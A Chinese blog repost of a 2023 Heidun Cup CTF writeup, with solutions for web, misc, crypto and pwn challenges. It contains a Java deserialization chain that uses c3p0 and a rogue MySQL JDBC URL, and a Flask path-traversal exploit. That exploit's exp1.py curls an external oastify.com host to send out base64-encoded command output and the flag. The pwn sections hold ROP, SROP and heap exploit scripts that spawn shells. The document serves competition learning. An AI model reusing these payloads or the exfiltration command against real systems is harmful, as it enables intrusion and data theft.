@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2023 黑盾杯 writeup | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 黑盾杯 writeup">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/2023%E9%BB%91%E7%9B%BE%E6%9D%AF-WriteUp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="JdbcRowSetImpl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/2023%E9%BB%91%E7%9B%BE%E6%9D%AF-WriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2023 黑盾杯 writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023 黑盾杯 writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023 黑盾杯 writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/118253.html">https://www.ctfiot.com/118253.html</a><br>ID: 118253</p>
+</blockquote>
+<p>EDI</p>
+<p>JOIN US ▶▶▶</p>
+<p>招新</p>
+<p>EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。</p>
+<p>欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱<a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x65;&#x64;&#105;&#x73;&#101;&#x63;&#46;&#x6e;&#101;&#x74;">&#114;&#x6f;&#x6f;&#116;&#64;&#x65;&#x64;&#105;&#x73;&#101;&#x63;&#46;&#x6e;&#101;&#x74;</a>、<a href="mailto:&#115;&#104;&#105;&#x79;&#105;&#64;&#x65;&#x64;&#x69;&#115;&#x65;&#x63;&#x2e;&#110;&#101;&#x74;">&#115;&#104;&#105;&#x79;&#105;&#64;&#x65;&#x64;&#x69;&#115;&#x65;&#x63;&#x2e;&#110;&#101;&#x74;</a>（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。</p>
+<p>点击蓝字 ·  关注我们</p>
+<p>01</p>
+<p>Web</p>
+<p>1</p>
+<p>web（初赛）</p>
+<p>拿到一个jar包，反编译得到。</p>
+<p>public class SecurityCheck { private final String input;<br> public SecurityCheck(String input) { this.input &#x3D; input; checkForBlockedClasses(); }<br> private void checkForBlockedClasses() { Pattern pattern &#x3D; Pattern.compile(“(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)”); if (pattern.matcher(this.input).find()) throw new SecurityException(“hacker”); }}</p>
+<p>package com.example;<br>import com.ctf.bean.MyBean;<br>import com.vaadin.data.util.NestedMethodProperty;<br>import com.vaadin.data.util.PropertysetItem;<br>import org.apache.commons.codec.binary.Hex;<br>import javax.management.BadAttributeValueExpException;<br>import java.io.*;<br>import java.lang.reflect.Field;<br>public class Exp { public static void main(String[] args) throws Exception {<br> MyBean myBean &#x3D;new MyBean(); myBean.setDatabase(“mysql:&#x2F;&#x2F;vps:<br>3306&#x2F;test?user&#x3D;fileread_file:&#x2F;&#x2F;&#x2F;flag.txt&amp;ALLOWLOADLOCALINFILE&#x3D;true&amp;maxAllowedPacket&#x3D;655360&amp;allowUrlInLocalInfile&#x3D;true#”);<br> PropertysetItem p &#x3D; new PropertysetItem();<br> NestedMethodProperty<Object> n &#x3D; new NestedMethodProperty<Object>(myBean, “Connection”);<br> p.addItemProperty(“Connection”, n);<br> BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(“v”); Field field &#x3D; BadAttributeValueExpException.class.getDeclaredField(“val”); field.setAccessible(true); field.set(badAttributeValueExpException, p);<br> ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream(); ObjectOutputStream out &#x3D; new ObjectOutputStream(bos); out.writeObject(badAttributeValueExpException); out.flush(); byte[] bytes &#x3D; bos.toByteArray();<br> char[] hexChars &#x3D; Hex.encodeHex(bytes); String hexString &#x3D; new String(hexChars);<br> System.out.println(hexString.toUpperCase()); }}</p>
+<p>然后把生成的hex字符串填在下面HexAsciiSerializedMap后面</p>
+<p>{“1”:{“@type”:”java.lang.Class”,”val”:”com.mchange.v2.c3p0.WrapperConnectionPoolDataSource”},”2”:{“@type”:”com.mchange.v2.c3p0.WrapperConnectionPoolDataSource”,”userOverridesAsString”:”HexAsciiSerializedMap:<br>tihuanzheli;”,}}</p>
+<p>2</p>
+<p>pypath（复赛）</p>
+<p>from flask import Flask, request, Responseimport osimport shutilimport site<br>app &#x3D; Flask(<strong>name</strong>)<br>@app.route(‘&#x2F;‘)def index(): return app.send_static_file(‘index.html’)<br>@app.route(‘&#x2F;upload’, methods&#x3D;[‘POST’])def upload(): f &#x3D; request.files[“data”] with open(f’&#x2F;tmp&#x2F;storage&#x2F;{f.filename}’, ‘wb+’) as destination: destination.write(f.read())    return Response(“File is uploaded!”, 200)</p>
+<p>传文件 默认&#x2F;tmp&#x2F;storage&#x2F;路径 目录穿越构造..&#x2F;</p>
+<p>@app.route(‘&#x2F;install’, methods&#x3D;[‘GET’])def install(): package_name &#x3D; request.args.get(‘package_name’) #获取包名 if ‘..’ in package_name: #防止穿越 return Response(“Not allowed!”, 400)<br> src &#x3D; os.path.join(‘contrib’, ‘packages’, package_name) dst &#x3D; os.path.join(‘&#x2F;tmp&#x2F;extract’, package_name)<br> shutil.copy(src, dst) shutil.unpack_archive(dst, extract_dir&#x3D;’&#x2F;tmp&#x2F;extract’)#安装包 return Response(“Installed!”, 200)</p>
+<p>@app.route(‘&#x2F;clean’, methods&#x3D;[‘GET’])def clean(): file &#x3D; os.path.basename(request.args.get(‘file’)) file_safe &#x3D; f’&#x2F;tmp&#x2F;storage&#x2F;{file}’ os.unlink(file_safe) return Response(“file removed!”, 200)</p>
+<p>@app.route(‘&#x2F;add’, methods&#x3D;[‘GET’])def add(): site_dir &#x3D; “&#x2F;tmp&#x2F;extract” name &#x3D; request.args.get(‘name’) site.addpackage(site_dir, name, None)#addpackage可以加一个python文件if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:    app.run(debug&#x3D;True, host&#x3D;’0.0.0.0’)</p>
+<p>用bp自带的Collaborator来dnslog</p>
+<p>构造exp.py</p>
+<p>exp1.py</p>
+<p>import os;os.system(“curl <a target="_blank" rel="noopener" href="http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/%60ls">http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`ls</a> &#x2F;|base64&#96;”)</p>
+<p>然后上传，去GET &#x2F;add?name&#x3D;exp1.py一次</p>
+<p>YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19vbmxpbmVfZG9ja2VyXzQ0NzhfNTgxXzIzNzIudHh0</p>
+<p>base64解密：appbinbootdevetcflag_online_docker_4478_581_2372.txt</p>
+<p>import os;os.system(“curl <a target="_blank" rel="noopener" href="http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/%60cat">http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`cat</a> &#x2F;flag_online_docker_4478_581_2372.txt|base64&#96;”)</p>
+<p>ZmxhZ3thODc3MWFiNGFhfQ&#x3D;&#x3D;base64解码：flag{a8771ab4aa}</p>
+<p>02</p>
+<p>Misc</p>
+<p>1</p>
+<p>DNS-流量分析（初赛）</p>
+<p>504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874<br>c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c625<br>87a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400<br>090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000<br>666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2<br>d4340e78d701504b050600000000010001005a0000006a0000000000</p>
+<p>密码爆破为：Ap3l，然后打开就是flag。</p>
+<p>flag{496d8981f449e45f6e39e1faa0b1ab8a}</p>
+<p>2</p>
+<p>mylog（初赛）</p>
+<p>mysqlbinlog mylog.000001 &gt; mysql.sql</p>
+<p>得到mysql.sql文件 导入mysql，source Y:<br>mysql.sql</p>
+<p>3</p>
+<p>威胁情报分享2（复赛）</p>
+<p>f &#x3D; open(“network.txt”,”r”)w &#x3D; open(“result.txt”,”w”)</p>
+<h1 id="a-‘-“Time”-”2023-1-1-0-17-27”-“SrcHost”-”192-168-194-119”-“DestHost”-”40-118-19-83”-’-print-a"><a href="#a-‘-“Time”-”2023-1-1-0-17-27”-“SrcHost”-”192-168-194-119”-“DestHost”-”40-118-19-83”-’-print-a" class="headerlink" title="a &#x3D; ‘{“Time”:”2023&#x2F;1&#x2F;1 0:17:27”, “SrcHost”:”192.168.194.119”, “DestHost”:”40.118.19.83”},’# print(a)"></a>a &#x3D; ‘{“Time”:”2023&#x2F;1&#x2F;1 0:17:27”, “SrcHost”:”192.168.194.119”, “DestHost”:”40.118.19.83”},’# print(a)</h1><p>for a in f.readlines(): a &#x3D; a.split(“”DestHost”:””)[1] a &#x3D; a.split(“”}”)[0] print(a) w.write(a+”n”)<br>f.closew.close</p>
+<p>再正则处理一下ioc.txt，直接在sublime里面操作，replace。</p>
+<p>{“type”:”domain”, “ioc”:” -&gt; 空{“type”:”ip”, “ioc”:” -&gt; 空”, “tag”:”.* -&gt; 空</p>
+<p>然后得到只有ip和域名的文本，用python进行匹配，找到相似点。</p>
+<p>f &#x3D; open(“ioc1.txt”,”r”)w &#x3D; open(“result.txt”,”r”)<br>for a in f.readlines(): for b in w.readlines(): b &#x3D; b[-6:] if b in a: print(b)<br>f.closew.close</p>
+<p>可以看到y.net在ioc和network中大量出现，猜测flag带y.net</p>
+<p>直接全部复制下来，一个个find，最后可以找到。</p>
+<p>flag{lprbriry.net}</p>
+<p>4</p>
+<p>QZ（复赛）</p>
+<p>ZmhxZ3sxMnF3YXN6eGNkZTN9base64解码为：fhqg{12qwaszxcde3}flag{12qwaszxcde3}</p>
+<p>03</p>
+<p>Crypto</p>
+<p>1</p>
+<p>py-math-game</p>
+<p>import pwn<br>from pwn import *pwn.context.log_level&#x3D;’debug’# 设置目标地址和端口host &#x3D; ‘39.104.26.167’port &#x3D; 6681</p>
+<h1 id="连接目标conn-remote-host-port"><a href="#连接目标conn-remote-host-port" class="headerlink" title="连接目标conn &#x3D; remote(host, port)"></a>连接目标conn &#x3D; remote(host, port)</h1><h1 id="转数据retest-conn-recv-retest-retest-decode-encoding-’utf-8’-retest1-retest-split-‘n’-n-int-retest1-1-split-“-”-1-sper-retest1-2-split-‘-’-0-newsper1-sper-replace-‘X’-’-’-flager-eval-newsper1"><a href="#转数据retest-conn-recv-retest-retest-decode-encoding-’utf-8’-retest1-retest-split-‘n’-n-int-retest1-1-split-“-”-1-sper-retest1-2-split-‘-’-0-newsper1-sper-replace-‘X’-’-’-flager-eval-newsper1" class="headerlink" title="转数据retest&#x3D;conn.recv()retest&#x3D;retest.decode(encoding&#x3D;’utf-8’)retest1&#x3D;retest.split(‘n’)n&#x3D;int(retest1[1].split(“&#x3D;”)[1])sper &#x3D; retest1[2].split(‘&#x3D;’)[0]newsper1 &#x3D; sper.replace(‘X’,’*’)flager &#x3D; eval(newsper1)"></a>转数据retest&#x3D;conn.recv()retest&#x3D;retest.decode(encoding&#x3D;’utf-8’)retest1&#x3D;retest.split(‘n’)n&#x3D;int(retest1[1].split(“&#x3D;”)[1])sper &#x3D; retest1[2].split(‘&#x3D;’)[0]newsper1 &#x3D; sper.replace(‘X’,’*’)flager &#x3D; eval(newsper1)</h1><h1 id="发送数据conn-sendline-str-flager-encode-encoding-’utf-8’-conn-recv-conn-sendline-b’open-“-flag-txt”-read-’-conn-recv"><a href="#发送数据conn-sendline-str-flager-encode-encoding-’utf-8’-conn-recv-conn-sendline-b’open-“-flag-txt”-read-’-conn-recv" class="headerlink" title="发送数据conn.sendline(str(flager).encode(encoding&#x3D;’utf-8’))conn.recv()conn.sendline(b’open(“&#x2F;flag.txt”).read()’)conn.recv()"></a>发送数据conn.sendline(str(flager).encode(encoding&#x3D;’utf-8’))conn.recv()conn.sendline(b’open(“&#x2F;flag.txt”).read()’)conn.recv()</h1><p>05</p>
+<p>Pwn</p>
+<p>1</p>
+<p>pwn（初赛）</p>
+<p>from pwn import *from struct import pack<br>from ctypes import *<br>def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b’x7f’)[-6:].ljust(8, b’x00’))def get_sb(): return libc_base + libc.sym[‘system’], libc_base + next(libc.search(b’&#x2F;bin&#x2F;shx00’))<br>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)p &#x3D; process(‘.&#x2F;pwn’)#p &#x3D; remote(‘39.104.26.167’, 27791)elf &#x3D; ELF(‘.&#x2F;pwn’)#libc &#x3D; ELF(‘&#x2F;home&#x2F;w1nd&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.5_amd64&#x2F;libc-2.27.so’)<br>kk &#x3D; b’{&gt;o&lt;fi:&#96;mjkj5daqd6fhugim~~rj5h&#x3D;’ret &#x3D; 0x400691rdi &#x3D; 0x400af3rsi_r15 &#x3D; 0x400af1PLT1 &#x3D; 0x4006A6buf &#x3D; elf.bss() + 0x400<br>#gdb.attach(p, ‘b *0x400a83’)<br>s(kk + b’x00’)sleep(1)s(b’a’*0x38 + p64(rsi_r15) + p64(elf.got[‘alarm’])*2 + p64(elf.sym[‘read’]) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym[‘read’]) + p64(0x400AEA) + p64(0)*2 + p64(elf.got[‘alarm’]) + p64(0)*2 + p64(buf) + p64(0x400AD0))sleep(2)s(b’xf5’)sleep(3)s(b’&#x2F;bin&#x2F;shx00’.ljust(0x3b, b’a’))<br>#pause()<br>inter()</p>
+<p>2</p>
+<p>leak</p>
+<p>没有free的堆，但是edit函数有offbyone漏洞</p>
+<p>存在onegadget，就不用泄露地址了，利用house of orange泄露地址，再用house of force。</p>
+<p>from pwn import *ly&#x3D;remote(‘39.104.26.167’,15910)#ly&#x3D;process(“.&#x2F;leak”)context.log_level &#x3D; “debug”libc&#x3D;ELF(‘&#x2F;home&#x2F;ly&#x2F;tools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so’)elf&#x3D;ELF(‘.&#x2F;leak’)def add(idx,size): ly.sendlineafter(b”Your choice:”,b’1’) ly.sendlineafter(b”Index:”,str(idx)) ly.sendlineafter(b”Size:”,str(size))def edit(idx,content): ly.sendlineafter(b”Your choice:”, b’2’) ly.sendlineafter(b”Index:”,str(idx)) ly.sendafter(b”Content:”,content)def show(idx): ly.sendlineafter(b”Your choice:”, b’3’) ly.sendlineafter(b”Index:”,str(idx))<br>def delete(idx): ly.sendlineafter(b”Your choice:”, b’4’) ly.sendlineafter(b”Index:”, str(idx))add(0,0x18)</p>
+<h1 id="house-of-orange-打个页对齐得size到top-chunkpayload-p64-0-3-p64-0xd91-edit-0-payload"><a href="#house-of-orange-打个页对齐得size到top-chunkpayload-p64-0-3-p64-0xd91-edit-0-payload" class="headerlink" title="house of orange 打个页对齐得size到top_chunkpayload&#x3D;p64(0)*3+p64(0xd91)edit(0,payload)"></a>house of orange 打个页对齐得size到top_chunkpayload&#x3D;p64(0)*3+p64(0xd91)edit(0,payload)</h1><h1 id="申请同样0xd91大小的chunk得到-ubsorted-binadd-1-0x1008"><a href="#申请同样0xd91大小的chunk得到-ubsorted-binadd-1-0x1008" class="headerlink" title="申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)"></a>申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)</h1><h1 id="拿unsorted-bin-一部分泄露libcadd-2-0xd50-show-2-libc-base-u64-ly-recvuntil-b’x7f’-6-ljust-8-b’x00’-0x3ec2a0malloc-hook-libc-base-libc-sym-‘-malloc-hook’-one-gadget-libc-base-0x10a2fc-onegadget-0x10a41c"><a href="#拿unsorted-bin-一部分泄露libcadd-2-0xd50-show-2-libc-base-u64-ly-recvuntil-b’x7f’-6-ljust-8-b’x00’-0x3ec2a0malloc-hook-libc-base-libc-sym-‘-malloc-hook’-one-gadget-libc-base-0x10a2fc-onegadget-0x10a41c" class="headerlink" title="拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base&#x3D;u64(ly.recvuntil(b’x7f’)[-6:].ljust(8,b’x00’))-0x3ec2a0malloc_hook&#x3D;libc_base+libc.sym[‘__malloc_hook’]one_gadget&#x3D;libc_base+0x10a2fc#onegadget 0x10a41c"></a>拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base&#x3D;u64(ly.recvuntil(b’x7f’)[-6:].ljust(8,b’x00’))-0x3ec2a0malloc_hook&#x3D;libc_base+libc.sym[‘__malloc_hook’]one_gadget&#x3D;libc_base+0x10a2fc#onegadget 0x10a41c</h1><h1 id="hosue-of-force堆溢出-改topchunk-size-为大数-达到任意地址分配的目的，直接劫持mallo-hook打one-gadgetedit-1-b’x00’-0x1008-p64-0xffffffffffffffff-add-3-0x22010-gdb-attach-ly-pause-add-4-0x100-edit-4-b’x07’-0x30-p64-malloc-hook-0x10-b’n’-add-5-0xa0-edit-5-p64-one-gadget-b’n’-add-6-0x200-ly-interactive"><a href="#hosue-of-force堆溢出-改topchunk-size-为大数-达到任意地址分配的目的，直接劫持mallo-hook打one-gadgetedit-1-b’x00’-0x1008-p64-0xffffffffffffffff-add-3-0x22010-gdb-attach-ly-pause-add-4-0x100-edit-4-b’x07’-0x30-p64-malloc-hook-0x10-b’n’-add-5-0xa0-edit-5-p64-one-gadget-b’n’-add-6-0x200-ly-interactive" class="headerlink" title="hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b’x00’*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b’x07’*0x30+p64(malloc_hook)*0x10+b’n’)add(5,0xa0)edit(5,p64(one_gadget)+b’n’)add(6,0x200)ly.interactive()"></a>hosue of force堆溢出 改topchunk size 为大数 